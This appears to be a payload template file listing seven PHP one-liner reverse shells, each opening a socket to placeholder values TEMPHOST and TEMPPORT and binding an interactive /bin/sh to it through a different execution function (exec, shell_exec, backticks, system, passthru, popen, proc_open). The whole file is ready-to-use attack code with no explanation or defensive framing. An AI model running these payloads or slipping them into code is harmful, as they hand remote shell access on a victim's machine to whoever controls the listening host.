php -r '$sock=fsockopen("TEMPHOST",TEMPPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("TEMPHOST",TEMPPORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("TEMPHOST",TEMPPORT);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("TEMPHOST",TEMPPORT);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("TEMPHOST",TEMPPORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("TEMPHOST",TEMPPORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("TEMPHOST",TEMPPORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
